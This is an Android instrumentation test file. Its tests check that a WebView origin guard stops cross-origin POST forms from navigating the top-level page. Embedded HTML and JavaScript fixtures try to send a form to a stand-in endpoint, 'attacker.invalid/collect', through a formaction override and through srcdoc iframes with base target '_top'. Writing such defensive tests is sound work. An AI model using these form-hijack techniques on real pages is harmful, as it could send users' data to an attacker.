package com.example

import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import androidx.webkit.WebViewCompat
import androidx.webkit.WebViewFeature
import com.example.core.security.buildMainFrameFormOriginGuard
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Assume.assumeTrue
import org.junit.Test
import org.junit.runner.RunWith
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

@RunWith(AndroidJUnit4::class)
class SafeWebViewPostOriginGuardTest {

    @Test
    fun crossOriginPostFormCannotNavigateTheTopLevelDocument() {
        assumeTrue(
            "The emulator WebView must support document-start JavaScript.",
            WebViewFeature.isFeatureSupported(WebViewFeature.DOCUMENT_START_SCRIPT)
        )

        val instrumentation = InstrumentationRegistry.getInstrumentation()
        val context = instrumentation.targetContext
        val completed = CountDownLatch(1)
        val result = AtomicReference<String?>(null)
        lateinit var webView: WebView

        instrumentation.runOnMainSync {
            webView = WebView(context).apply {
                settings.javaScriptEnabled = true
                WebViewCompat.addDocumentStartJavaScript(
                    this,
                    buildMainFrameFormOriginGuard("https://sitebin.test/"),
                    setOf("*")
                )
                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView?, url: String?) {
                        view?.evaluateJavascript(
                            "location.origin + '|' + " +
                                "document.body.getAttribute('data-post-attempted') + '|' + " +
                                "document.body.getAttribute('data-origin-after-submit')"
                        ) { value ->
                            result.set(value)
                            completed.countDown()
                        }
                    }
                }

                val html = """
                    <!doctype html>
                    <html>
                    <head><meta charset="utf-8"></head>
                    <body>
                    <script>
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = 'https://sitebin.test/allowed';
                        const submitter = document.createElement('button');
                        submitter.type = 'submit';
                        submitter.setAttribute('formaction', 'https://attacker.invalid/collect');
                        submitter.textContent = 'submit';
                        form.appendChild(submitter);
                        document.body.appendChild(form);
                        document.body.setAttribute('data-post-attempted', 'true');
                        submitter.click();
                        document.body.setAttribute('data-origin-after-submit', location.origin);
                    </script>
                    </body>
                    </html>
                """.trimIndent()

                loadDataWithBaseURL(
                    "https://sitebin.test/",
                    html,
                    "text/html",
                    "UTF-8",
                    null
                )
            }
        }

        try {
            assertTrue("WebView did not finish the local test page.", completed.await(10, TimeUnit.SECONDS))
            assertEquals(
                "\"https://sitebin.test|true|https://sitebin.test\"",
                result.get()
            )
        } finally {
            instrumentation.runOnMainSync {
                webView.stopLoading()
                webView.destroy()
            }
        }
    }

    @Test
    fun iframeBaseTargetCannotOverrideTheValidatedTopLevelOrigin() {
        assumeTrue(
            "The emulator WebView must support document-start JavaScript.",
            WebViewFeature.isFeatureSupported(WebViewFeature.DOCUMENT_START_SCRIPT)
        )

        val instrumentation = InstrumentationRegistry.getInstrumentation()
        val context = instrumentation.targetContext
        val completed = CountDownLatch(1)
        val result = AtomicReference<String?>(null)
        val failure = AtomicReference<String?>(null)
        lateinit var webView: WebView

        instrumentation.runOnMainSync {
            webView = WebView(context).apply {
                settings.javaScriptEnabled = true
                WebViewCompat.addDocumentStartJavaScript(
                    this,
                    buildMainFrameFormOriginGuard("https://sitebin.test/"),
                    setOf("*")
                )
                webViewClient = object : WebViewClient() {
                    private var initialPageCheckStarted = false

                    override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                        super.onPageStarted(view, url, favicon)
                        if (!url.isNullOrBlank() && !url.startsWith("https://sitebin.test/")) {
                            failure.compareAndSet(null, "Unexpected main-frame navigation: " + url)
                            completed.countDown()
                        }
                    }

                    override fun onReceivedError(
                        view: WebView?,
                        request: android.webkit.WebResourceRequest?,
                        error: android.webkit.WebResourceError?
                    ) {
                        super.onReceivedError(view, request, error)
                        if (request?.isForMainFrame == true) {
                            failure.compareAndSet(
                                null,
                                "Main-frame load failed at " + request.url + ": " + error?.description
                            )
                            completed.countDown()
                        }
                    }

                    override fun onReceivedHttpError(
                        view: WebView?,
                        request: android.webkit.WebResourceRequest?,
                        errorResponse: android.webkit.WebResourceResponse?
                    ) {
                        super.onReceivedHttpError(view, request, errorResponse)
                        if (request?.isForMainFrame == true) {
                            failure.compareAndSet(
                                null,
                                "Main-frame HTTP " + errorResponse?.statusCode + " at " + request.url
                            )
                            completed.countDown()
                        }
                    }

                    override fun onPageFinished(view: WebView?, url: String?) {
                        if (initialPageCheckStarted) return
                        if (url?.startsWith("https://sitebin.test/") != true) {
                            failure.compareAndSet(null, "Unexpected page-finished URL: " + url)
                            completed.countDown()
                            return
                        }
                        initialPageCheckStarted = true

                        view?.evaluateJavascript(
                            """
                            (function () {
                                const frame = document.createElement('iframe');
                                const childMarkup =
                                    '<!doctype html><html><head><base target="_top"></head>' +
                                    '<body><form id="f" method="POST" action="https://attacker.invalid/collect"></form>' +
                                    '<script>document.getElementById("f").submit();</' + 'script>' +
                                    '</body></html>';

                                // Cover both common dynamic srcdoc APIs; the child
                                // document must be guarded before its inline script runs.
                                frame.srcdoc = childMarkup;
                                document.body.appendChild(frame);

                                const attributeFrame = document.createElement('iframe');
                                attributeFrame.setAttribute('srcdoc', childMarkup);
                                document.body.appendChild(attributeFrame);
                                return true;
                            })();
                            """.trimIndent()
                        ) {
                            view?.postDelayed({
                                view.evaluateJavascript("window.location.href") { currentUrl ->
                                    result.set(currentUrl)
                                    completed.countDown()
                                }
                            }, 750L)
                        } ?: run {
                            failure.compareAndSet(null, "WebView became unavailable before iframe verification.")
                            completed.countDown()
                        }
                    }
                }

                loadDataWithBaseURL(
                    "https://sitebin.test/",
                    "<!doctype html><html><head></head><body></body></html>",
                    "text/html",
                    "UTF-8",
                    null
                )
            }
        }

        try {
            val finishedInTime = completed.await(10, TimeUnit.SECONDS)
            if (!finishedInTime) {
                val currentUrl = AtomicReference<String?>(null)
                instrumentation.runOnMainSync { currentUrl.set(webView.url) }
                failure.compareAndSet(null, "Timed out; current WebView URL=" + currentUrl.get())
            }
            assertTrue(
                "WebView did not complete the iframe guard check: " + failure.get(),
                finishedInTime
            )
            failure.get()?.let { throw AssertionError(it) }
            assertEquals("\"https://sitebin.test/\"", result.get())
        } finally {
            instrumentation.runOnMainSync {
                webView.stopLoading()
                webView.destroy()
            }
        }
    }
}
